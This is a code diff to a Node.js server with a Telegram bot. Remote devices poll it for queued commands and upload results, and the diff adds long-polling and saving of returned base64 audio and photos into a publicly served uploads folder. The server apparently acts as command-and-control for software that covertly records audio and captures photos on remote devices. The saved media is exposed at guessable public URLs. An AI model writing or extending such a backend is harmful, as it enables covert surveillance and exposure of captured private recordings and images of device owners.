@@ -4,6 +4,13 @@ const { Telegraf, Markup } = require('telegraf');
 const sqlite3 = require('sqlite3').verbose();
 const { open } = require('sqlite');
 const path = require('path');
+const fs = require('fs');
+
+// Direktori Upload Statik untuk Media
+const uploadsDir = path.join(__dirname, 'public/uploads');
+if (!fs.existsSync(uploadsDir)) {
+    fs.mkdirSync(uploadsDir, { recursive: true });
+}
 const { v4: uuidv4 } = require('uuid');
 const bodyParser = require('body-parser');
 const cookieParser = require('cookie-parser');
@@ -62,6 +69,8 @@ app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
 app.use(cookieParser());
 app.set('view engine', 'ejs');
 app.set('views', path.join(__dirname, 'templates'));
+// Ekspos folder public agar bisa diakses browser
+app.use('/public', express.static(path.join(__dirname, 'public')));
 
 // Helper function
 const updateDeviceSeen = async (deviceId) => {
@@ -501,15 +510,29 @@ app.get('/poll', async (req, res) => {
 
     await updateDeviceSeen(client_id);
 
-    const cmd = await db.get('SELECT * FROM commands WHERE device_id = ? AND status = ? ORDER BY created_at ASC LIMIT 1',
-        [client_id, 'pending']);
+    // Mekanisme Long-Polling (Maks 25 detik menahan koneksi)
+    const MAX_WAIT_MS = 25000;
+    const POLL_INTERVAL_MS = 1000;
+    let waited = 0;
 
-    if (cmd) {
-        await db.run('UPDATE commands SET status = ? WHERE id = ?', ['sent', cmd.id]);
-        return res.json({ command: cmd.command, text: cmd.text || '', id: cmd.id });
+    // Loop penundaan sinkron ke database
+    while (waited < MAX_WAIT_MS) {
+        const cmd = await db.get('SELECT * FROM commands WHERE device_id = ? AND status = ? ORDER BY created_at ASC LIMIT 1',
+            [client_id, 'pending']);
+
+        if (cmd) {
+            await db.run('UPDATE commands SET status = ? WHERE id = ?', ['sent', cmd.id]);
+            return res.json({ command: cmd.command, text: cmd.text || '', id: cmd.id });
+        }
+
+        await new Promise(resolve => setTimeout(resolve, POLL_INTERVAL_MS));
+        waited += POLL_INTERVAL_MS;
+
+        // Tetap perbarui timestamp online jika menunggu sangat lama
+        if (waited % 5000 === 0) await updateDeviceSeen(client_id);
     }
 
-    res.json({ command: 'none' });
+    res.json({ command: 'none' }); // Time Out
 });
 
 app.post('/response', async (req, res) => {
@@ -519,8 +542,26 @@ app.post('/response', async (req, res) => {
 
     await updateDeviceSeen(client_id);
 
+    // Kloning objek agar modifikasi tidak merusak Telegram responder
+    let logData = { ...data };
+    try {
+        if (data.type === 'audio_base64' && data.data) {
+            const filename = `audio_${client_id}_${Date.now()}.mp4`;
+            fs.writeFileSync(path.join(uploadsDir, filename), Buffer.from(data.data, 'base64'));
+            logData.type = 'audio_url';
+            logData.data = `/public/uploads/${filename}`;
+        } else if (data.type === 'photo_base64' && data.data) {
+            const filename = `photo_${client_id}_${Date.now()}.jpg`;
+            fs.writeFileSync(path.join(uploadsDir, filename), Buffer.from(data.data, 'base64'));
+            logData.type = 'photo_url';
+            logData.data = `/public/uploads/${filename}`;
+        }
+    } catch (e) {
+        console.error("Gagal mengekstrak media ke file fisik:", e);
+    }
+
     await db.run('INSERT INTO system_logs (device_id, command_id, level, message) VALUES (?, ?, ?, ?)',
-        [client_id, data.id || null, data.level || 'INFO', JSON.stringify(data)]);
+        [client_id, data.id || null, data.level || 'INFO', JSON.stringify(logData)]);
 
     if (data.id) {
         await db.run('UPDATE commands SET status = ? WHERE id = ?', ['completed', data.id]);
